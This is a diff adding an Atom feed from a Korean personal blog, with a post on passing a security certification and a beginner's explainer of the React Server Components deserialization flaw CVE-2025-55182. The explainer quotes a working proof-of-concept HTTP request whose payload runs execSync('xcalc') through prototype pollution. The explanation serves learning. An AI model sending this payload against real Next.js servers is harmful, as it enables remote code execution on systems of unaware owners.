@@ -1,0 +1,144 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="ko">
+    <title>JJJade Log</title>
+    <link rel="self" type="application/atom+xml" href="https://jjj-ade.github.io/atom.xml"/>
+    <link rel="alternate" type="text/html" href="https://jjj-ade.github.io/"/>
+    <generator uri="https://www.getzola.org/">Zola</generator>
+    <updated>2025-12-19T00:00:00+00:00</updated>
+    <id>https://jjj-ade.github.io/atom.xml</id>
+    <entry xml:lang="ko">
+        <title>정보보안기사</title>
+        <published>2025-12-19T00:00:00+00:00</published>
+        <updated>2025-12-19T00:00:00+00:00</updated>
+        
+        <author>
+          <name>
+            
+              Unknown
+            
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://jjj-ade.github.io/study/certification/2025-12-19/"/>
+        <id>https://jjj-ade.github.io/study/certification/2025-12-19/</id>
+        
+        <content type="html" xml:base="https://jjj-ade.github.io/study/certification/2025-12-19/">&lt;h2 id=&quot;deuleogagi-apseo&quot;&gt;들어가기 앞서&lt;&#x2F;h2&gt;
+&lt;p&gt;저는 한달만에 딴다거나, 전략을 세웠다거나, 어느 부분을 중점적으로 봤다거나 하는 것은 없었습니다. 엄청나게 성실한 성격도 아니고(운동을 하겠다는 다짐을 세우면 한 달에 하루 정도 나갑니다.) 평소에 하고 싶은게 워낙 많아 이것 조금, 저것 조금으로 하루를 채우는 성격 입니다.(독서도 병렬독서를 즐깁니다.) 인터넷 강의 같은 건 듣지 않고(그래서 좀 더 취득이 늦었을 수도요) 알기사 실기책을 통해 3번의 시험 접수를 통해 끝내 합격했습니다.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;gyojae&quot;&gt;교재&lt;&#x2F;h2&gt;
+&lt;h3 id=&quot;nyeondo-suga-jungyohanga&quot;&gt;년도 수가 중요한가?&lt;&#x2F;h3&gt;
+&lt;p&gt;지금 와서 돌이켜보면 정말 후회하는 일은, 2025년도 교재를 사지 않았던 것입니다. 저는 주기적으로 &#x27;정보보안기사 병&#x27;이 오는 사람이라 2023년, 2024년도 교재를 이미 가지고 있었습니다. 2023년도와 2024년도의 교재가 내용 차이가 적었기에 당연히 그대로 공부해도 될 것이라 생각했고 2025년도 1차 시험에 임했습니다. 1차 시험을 보니 문제 유형이 조금 다르다는 생각에 2025년도 교재를 구매했고 저는 진작 사지 않은 것을 후회했습니다.&lt;&#x2F;p&gt;
+&lt;p&gt;완전히 다른 교재가 있었습니다.. 정리도 훨씬 더 잘 되었고 이곳 저곳 가독성을 위해 손을 댔다는 느낌이 확실히 있습니다. 얼추 2022년~2024년 교재를 다 본적이 있는데(2024년도 교재 제외 공부한게 아니고 정말 Just see 했습니다) 2025년도 교재는 1회독이 정말 편했습니다.&lt;&#x2F;p&gt;
+&lt;p&gt;사실 정보보안기사를 보시는 분들중 대부분이 알기사 책으로 공부하실 것 같은데 이게 1회독이 편한 책은 아닙니다.. (당사자성 발언) 만약 공부를 하신다면 문제집 리뉴얼도 매 해마다 되는것이 아니니 가지고 계신 책과 서점에 새로 나온 책을 비교 후 결정하시길 바랍니다. 예전에 좋은 경험 쌓기로 시험을 보러 갔던 적이 있는데 그때나 지금이나 년도에 민감한 문제들(예를들어 25년에 개정된 법관련 내용이라던가)은 본적이 없는 것 같습니다. 그렇기 때문에 교재의 년도수는 리뉴얼 된다면 중요하다. 입니다.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;un&quot;&gt;운&lt;&#x2F;h2&gt;
+&lt;p&gt;저는 운기칠삼이라는 말을 정말 많이 믿습니다. 사실 운기칠삼에서 더 나아가 9할이 운 인것 같다는 것을 매번 느끼고 있습니다. 그렇기에 떨어져도 타격이 비교적 적습니다. 노력을 안 한건 아니니 나에게 잘 맞는 운이 다가온다면 붙을 걸 알았으니까요.(3트 후에도 못 붙으면 사실 한 번은 더 볼 생각이었습니다.) 모든 시험이 다 그렇듯 시험의 난이도는 매번 다릅니다. 이번 시험은 공부도 하긴 했지만 운이 좋아서 붙었다는 느낌을 지울 수가 없는 시험이었습니다.&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;이전 시험에서 나온 &amp;lt;보안 관제의 3요소를 적으시오&amp;gt; 나 외벽의 CCTV 설치와 관련된 개인정보 보호 요소 같은 &#x27;교과서식 문제가 아닌 문제&#x27; 가 없었다.&lt;&#x2F;li&gt;
+&lt;li&gt;이 분야는 나올때 쯤 됐다. 혹은 이번 년도에서 좀 중요해 보인다 싶었던 분야의 문제가 그대로 나왔다.&lt;&#x2F;li&gt;
+&lt;li&gt;마지막 16점 짜리 문제가 너무 쉬웠다. (마침 직전에 SQL 공부를 했었었음)&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;p&gt;이 모두가 들어 맞아 합격할 수 있었던 것 같습니다. 특히 1번은 저에게 아주 중요했는데 왜냐하면 누군가에게 가르침을 받는 형태(강의)가 아닌 오직 책만을 통해서 공부를 해야 했기 때문입니다. 진짜 보안 관제 3요소는 다시 봐도 어떤 답을 원했는지 잘 모르겠습니다;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;gongburyang&quot;&gt;공부량&lt;&#x2F;h2&gt;
+&lt;p&gt;솔직히 밀도있는 공부를 한 것은 아니고 하루 전에 12시간동안 1회독+기출1회독 약 1400페이지를 머리에 바르고 갔습니다. 왜냐하면 1차때 1회독 + 20% 분량을 정리했고 2차때 다시 1회독 하면서 70% 분량을 정리했기 때문입니다. 그렇게 예전에 발라둔 기억은 대다수 휘발되었지만 익숙한 내용을 다시 바르게 되면 기억이 튀어나올 수 있을 것 같아서 이런 선택을 했습니다. 직장 병행에 중간 중간 일들이 있었기에 1,2,4차 모두 시험 한달전부터 공부를 했던 것 같습니다. 몇달 전부터 공부하겠다는게 다짐은 쉬워도 행동이 잘 안 따라 주었습니다.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;geuraeseo-igeo-ddayahana&quot;&gt;그래서 이거 따야하나?&lt;&#x2F;h2&gt;
+&lt;p&gt;난이도로 생각한다면 누군가한테는 한 달 빡세게 버닝하면 합격할 수 있는 시험이고, 누군가한테는 정말 어려운 시험일 것입니다. (저는 그걸 약 1년간 질질 끌어왔었습니다.) 제가 보안기사 홈페이지를 들어가기 위해 검색을 하다보면 많은 커뮤니티에서 재밌는 글을 보게 되는데 합격자가 10% 미만 시절에도 해당 자격증을 무시하는 글들은 있었습니다. 그냥 취업이든, 시험이든, 대학이든 내가 힘들게 들어간거면 그만큼 가치가 높아 보이고 요행으로 들어가게 된다면 그만큼 가치가 낮게 보입니다. (저는 너무 지겹고 힘들었기 때문에 제안에서의 가치는 짱짱맨입니다.)&lt;&#x2F;p&gt;
+&lt;p&gt;보안에서 일하고 싶다고 생각하면 엄청 따야하는 자격증은 아니지만 (왜냐하면 정보보안 하지만 안따는 사람 3억명) 그렇다고 따는게 으휴 쯧쯧 시간낭비 취급을 받진 않는 정도 입니다. 공고를 보더라도 우대 사항으로 쳐주며, 공기업을 가도 전산 보안 분야에서 가산점을 주는 자격증이니까요. 그냥 따면 좋다 입니다.&lt;&#x2F;p&gt;
+&lt;p&gt;사실 저는 비전공자에 정보보안을 하겠다고 온터라 이게 꼭 필요했지만요,, 왜 그렇게 필요했던 자격증을 이제와서야 땄냐고는 묻지 마세요...&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;coejong-jeongri&quot;&gt;최종 정리&lt;&#x2F;h2&gt;
+&lt;ol&gt;
+&lt;li&gt;교재는 많이들 쓰는게 짱인데 알기사로 했다. 근데 갑자기 리뉴얼 되면서 교재 질이 좋아지는 경우도 있으니 그 해 1트에 끝내는 것이 아니라면 서점가서 새로운 년도 교재를 확인할 것&lt;&#x2F;li&gt;
+&lt;li&gt;공부 할만큼 한 것 같은데 떨어졌으면 포기하지 말고 다음 차수 시험을 보러라도 가보기. 운이 안 좋거나 나랑 안 맞는 유형이 다수 출제 됐을 수도 있다.&lt;&#x2F;li&gt;
+&lt;li&gt;만약 준비 기간이 짧다면 알기사 교재라는 가정 하에 기본서 700페이지 읽을 시간에 기출 문제 읽으면서 문제 내 개념 빠르게 머리에 넣고 기출 회독만 돌리기 (근데 사전 지식이 없다면 기본서 꼬옥 읽으세요.. 운 파트에 1번과 같은 응용 문제 기본서 보면 대충 이거겠구나 하는게 있긴 합니다.)&lt;&#x2F;li&gt;
+&lt;li&gt;그리고 이제 합격은 문자로 안 온다. 알림톡으로 옴(시간 맞춰 합격 확인 하러 갈 필요 없음)
+&lt;img src=&quot;&#x2F;images&#x2F;study&#x2F;certificate&#x2F;IMG_8738.jpg&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="ko">
+        <title>12월 2번째 주</title>
+        <published>2025-12-11T00:00:00+00:00</published>
+        <updated>2025-12-11T00:00:00+00:00</updated>
+        
+        <author>
+          <name>
+            
+              Unknown
+            
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://jjj-ade.github.io/study/wil/2025/2025-12-2/"/>
+        <id>https://jjj-ade.github.io/study/wil/2025/2025-12-2/</id>
+        
+        <content type="html" xml:base="https://jjj-ade.github.io/study/wil/2025/2025-12-2/">&lt;div role=&quot;alert&quot; class=&quot;alert alert-info alert-soft&quot;&gt;
+  &lt;span&gt;초보 수준의 이해기를 담은 글입니다.&lt;&#x2F;span&gt;
+&lt;&#x2F;div&gt;
+&lt;h2 id=&quot;deuleogagi-apseo&quot;&gt;들어가기 앞서&lt;&#x2F;h2&gt;
+&lt;p&gt;평소와 같이 출근을 하던 김포테이토는 잔뜩 생긴 신규 정책을 둘러보느라 정신이 없습니다. CVSS 10 점을 받고 제 2의 Log4j라느니 뭐니 떠들썩 합니다. 그렇게 중요한 것이라면 공부 해야지! 강한 의욕을 가지고 공식 문서와 기술 블로그를 읽어봅니다. 봐도봐도 무슨 말인지 잘 모르겠습니다. 취약점 공부는 중요하기 때문에 인상을 팍 찌푸리고 억지로 한글자씩 읽어 나갑니다.&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#212733;color:#ccc9c2;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;#39;RSC 기능을 통해.. RSC? 이게 뭐야.. 역질렬화를.. 청크가.. 뭔데?.. 아니 애초에 이게 뭔 기능을 하던건데.. 
+&lt;&#x2F;span&gt;&lt;span&gt;세상 사람들은 React를 다 쓰고 사나봐.. 나만 모르는 거 같은데..&amp;#39;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;자기들끼리 아는 얘기를 신나게 하고 있습니다. 전혀 이해하지 못하고 이게 뭔지도 모르는 김포테이토는 어색하게 웃으며 주변 동료들에게 끄덕입니다. 그래그래, 정말 위험하다. 와 이런 취약점이! 김포테이토는 뭔지도 모르겠는 NIST 문서를 끄고 이메일을 확인하기로 합니다.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;gicobuteo&quot;&gt;기초부터&lt;&#x2F;h2&gt;
+&lt;h3 id=&quot;react&quot;&gt;React&lt;&#x2F;h3&gt;
+&lt;p&gt;React를 처음 검색하면 UI를 만드는데 도움을 주는 JavaScript 라이브러리 라고 합니다. 사실상 이 취약점을 공부하기 위해서 React를 어떻게 쓰는지, Nest.js랑 무슨 차이점이 있고 등등 마치 리액트 학개론 쪽지시험에 나올법한 자세한 내용은 알지 않아도 됩니다. 왜냐하면 보안인인 김포테이토에게는 시간이 한정되어 있기 때문입니다.&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;사용자 인터페이스를 만들기 위한 JavaScript 라이브러리이다.&lt;&#x2F;li&gt;
+&lt;li&gt;컴포넌트 기반이다 (UI를 재사용 및 코드 중복을 줄이고 보수를 용이하게 하기위해)&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;p&gt;이정도만 끄덕끄덕 이해하고 넘어갑니다.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;next-js&quot;&gt;Next.js&lt;&#x2F;h3&gt;
+&lt;p&gt;Server Side Rendering, 정적 웹 페이지 생성 등 리액트 기반 오픈 소스 웹 개발 프레임워크 입니다. 설명을 읽던 김포테이토는 눈을 깍 감습니다.(김포테이토: 뭔소리여..!!ㅠㅠ) 서버 렌더링과 정적 웹 사이트 생성 부분을 연속해서 읽습니다. 용어가 와닿지 않으니 계속해서 같은 구문을 빙빙 돕니다. (그냥 서버에서 페이지를 만들어서 보내준다고 생각하면 됩니다.)&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;리액트 기반으로 웹 페이지 뚝딱 따라란~ 을 도와주는 도구다&lt;&#x2F;li&gt;
+&lt;li&gt;Client Side 가 아닌 Server Side 에서 랜더링을 해주는 녀석이다.&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;h3 id=&quot;rsc-react-server-components&quot;&gt;RSC(React Server Components)&lt;&#x2F;h3&gt;
+&lt;p&gt;다행히 김포테이토군은 앞선 지식으로 React가 Server 쪽에서 렌더링을 해준다는 것을 배웠습니다. 이름을 보자마자 직관적으로 이해가 가기 시작합니다.&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#212733;color:#ccc9c2;&quot;&gt;&lt;code&gt;&lt;span&gt;아! React가 Server Side Rendering을 하기 위해 처리하고자 하는 Components 구나!
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;직독직해의 냄새가 나지만 이정도면 괜찮습니다. 아무튼, React 에서 웹 구현을 위해 Server와 Client 간 와리가리 하는 &#x27;무언가&#x27; 입니다. 비슷한 것으로 JSON이 있었습니다. JSON 데이터와 다르게 RSC는 여러 가지 처리가 가능합니다. {key:value} 와 같이 단순한 형태가 아닌, {&quot;결제자&quot;:&quot;박대리&quot;, &quot;김포테이토&quot;:&quot;고민중&quot;, &quot;박차장&quot;:&quot;김포테이토와 같은 것&quot;, &quot;리뷰이벤트&quot;:&quot;3번 군만두&quot;} 수준으로 처리가 가능해집니다. 쪼개서 전송을 하면서 응답값 처리가 각자 시간이 다르기 때문에 &#x27;뒤에 오는 응답값을 보고서 이거를 해&#x27; 라는 사기적인 요청도 가능해집니다. (여기서 Promise, Then 개념이 등장합니다.) 앞서 나온 &lt;code&gt;청크&lt;&#x2F;code&gt; 라는 아~주 어려워 보이는 개념은 간단합니다. 이 조각 조각 땃따따 쪼개놓은 것을 청크라고 합니다. React는 RSC를 Flight Protocol을 통해 전달합니다. 그냥 보낼 때 사용하는 독자적인 프로토콜로 자세히 알면 다칩니다.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;jigryeolhwa-yeogjigryeolhwa&quot;&gt;직렬화, 역직렬화&lt;&#x2F;h3&gt;
+&lt;p&gt;직렬화는 프로그램 내부에서 사용하는 객체, 데이터를 다른 프로그램에 전달해 사용할 수 있도록 바이트 형태로 변환하는 것이고 역직렬화는 당연히 그 반대의 의미를 말합니다.&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;모든 프로그램이 (당연하게도) 같은 포맷을 쓰지 않기 때문에 표준 포맷 필요&lt;&#x2F;li&gt;
+&lt;li&gt;네트워크로 보내려면 바이트 형태여야함&lt;&#x2F;li&gt;
+&lt;li&gt;프로그램에서는 객체가 컴퓨터 내부 포인터 형태라서 그대로 전송 못 함.&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;p&gt;중국 지사 왕과장에게 김포테이토가 한국어로 전달할 수 없듯이, 버스에 타고서 앞에서 2번째 좌석으로 짜장면을 배달 시키고 버스에서 내려버리면 짜장면을 받을 수 없듯이, 여러 문제를 해결하기 위해 직렬화는 중요합니다. JavaScript 에서는 &lt;code&gt;const obj = { name : &quot;potato&quot;, age : &quot;90&quot; };&lt;&#x2F;code&gt; 의 JavaScript 객체를 &lt;code&gt;{&quot;name&quot;:&quot;potato&quot;, &quot;age&quot;:90}&lt;&#x2F;code&gt; 형태로 네트워크에 태워 보내는 것입니다.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;flight-protocol&quot;&gt;Flight Protocol&lt;&#x2F;h3&gt;
+&lt;h2 id=&quot;peirodeu-humcyeobogi&quot;&gt;페이로드 훔쳐보기&lt;&#x2F;h2&gt;
+&lt;pre style=&quot;background-color:#212733;color:#ccc9c2;&quot;&gt;&lt;code&gt;&lt;span&gt;POST &#x2F; HTTP&#x2F;1.1
+&lt;&#x2F;span&gt;&lt;span&gt;Host: localhost
+&lt;&#x2F;span&gt;&lt;span&gt;User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;142.0.0.0 Safari&#x2F;537.36
+&lt;&#x2F;span&gt;&lt;span&gt;Next-Action: x
+&lt;&#x2F;span&gt;&lt;span&gt;Content-Type: multipart&#x2F;form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
+&lt;&#x2F;span&gt;&lt;span&gt;Content-Length: 459
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+&lt;&#x2F;span&gt;&lt;span&gt;Content-Disposition: form-data; name=&amp;quot;0&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;{&amp;quot;then&amp;quot;:&amp;quot;$1:__proto__:then&amp;quot;,&amp;quot;status&amp;quot;:&amp;quot;resolved_model&amp;quot;,&amp;quot;reason&amp;quot;:-1,&amp;quot;value&amp;quot;:&amp;quot;{\&amp;quot;then\&amp;quot;:\&amp;quot;$B1337\&amp;quot;}&amp;quot;,&amp;quot;_response&amp;quot;:{&amp;quot;_prefix&amp;quot;:&amp;quot;process.mainModule.require(&amp;#39;child_process&amp;#39;).execSync(&amp;#39;xcalc&amp;#39;);&amp;quot;,&amp;quot;_formData&amp;quot;:{&amp;quot;get&amp;quot;:&amp;quot;$1:constructor:constructor&amp;quot;}}}
+&lt;&#x2F;span&gt;&lt;span&gt;------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+&lt;&#x2F;span&gt;&lt;span&gt;Content-Disposition: form-data; name=&amp;quot;1&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;$@0&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;예의상 이분의 gist git 을 그대로 긁어오고 싶었으나, 저주받은 CSS 설정 상 gist  는 자동 줄바꿈이 되지 않기 때문에 부득이하게 코드 형태로 긁어왔습니다. 출처는 &lt;a href=&quot;https:&#x2F;&#x2F;gist.github.com&#x2F;maple3142&#x2F;48bc9393f45e068cf8c90ab865c0f5f3#file-cve-2025-55182-http&quot;&gt;&lt;strong&gt;이곳&lt;&#x2F;strong&gt;&lt;&#x2F;a&gt; 입니다. 자 이제 김포테이토는 다시 한 번 페이로드를 읽어봅니다. 처음 &lt;code&gt;Next-Action&lt;&#x2F;code&gt; 과 &lt;code&gt;multipart&lt;&#x2F;code&gt; 가 보입니다. &lt;code&gt;Next-Action&lt;&#x2F;code&gt; 은 React&#x2F;Next.js 실행 시 RSC의 서버 함수 호출을 부르기 위한 커스텀 헤더입니다. 이 부분이 꼭 존재해야만 RSC 처리로 전달됩니다. &lt;code&gt;multipart&lt;&#x2F;code&gt; 는 조각 조각 따따따 (여러개의 청크로 이루어 졌다는 뜻) 하여 전송한다는 뜻으로 사용되었습니다. 바디 값부터 엄청나게 중요한 부분이 나옵니다.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;code&gt;Content-Disposition: form-data; name=&quot;0&quot;&lt;&#x2F;code&gt; 에서 name=&quot;0&quot; 이라는 특이한 부분이 눈에 띕니다. 해당 부분은 청크 ID로 0번째 조각 이라는 뜻입니다. 첫 번째 조각을 정리하면 다음과 같습니다.&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#212733;color:#ccc9c2;&quot;&gt;&lt;code&gt;&lt;span&gt;{&amp;quot;then&amp;quot;:&amp;quot;$1:__proto__:then&amp;quot;,
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;status&amp;quot;:&amp;quot;resolved_model&amp;quot;,
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;reason&amp;quot;:-1,
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;value&amp;quot;:&amp;quot;{\&amp;quot;then\&amp;quot;:\&amp;quot;$B1337\&amp;quot;}&amp;quot;,
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;_response&amp;quot;:{&amp;quot;_prefix&amp;quot;:&amp;quot;process.mainModule.require(&amp;#39;child_process&amp;#39;).execSync(&amp;#39;xcalc&amp;#39;);&amp;quot;,
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;_formData&amp;quot;:{&amp;quot;get&amp;quot;:&amp;quot;$1:constructor:constructor&amp;quot;}}}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;then 이 보입니다. 이것은 앞서 회사 점심메뉴 주문에서 스쳐가듯 나온 부분입니다. 여기서 thenable 이라는 아주 중요한 개념이 등장합니다. (김포테이토: 그만나와!!) 하지만 보안인의 시간은 늘 없기 때문에 간단하게 설명 하자면, &lt;code&gt;then() 이 되는 것&lt;&#x2F;code&gt; 입니다.(한때 유행했던 0블리랑 비슷한 느낌이 듭니다.) Flight 프로토콜은 thenable 객체를 특별하게 처리하기 때문에 사실상 &lt;code&gt;&quot;_response&quot;&lt;&#x2F;code&gt; 구문 전까지 최대한 then 이 있는 것처럼 잔뜩 깃털을 부풀린 모습입니다.&lt;&#x2F;p&gt;
+&lt;div role=&quot;alert&quot; class=&quot;alert alert-info alert-outline&quot;&gt;
+  &lt;span&gt;글이 점점 길어져 부득이하게 1과 2로 나누겠습니다. (계속해서 새로운 정보가 업데이트 되더라구요;)&lt;&#x2F;span&gt;
+&lt;&#x2F;div&gt;
+</content>
+        
+    </entry>
+</feed>
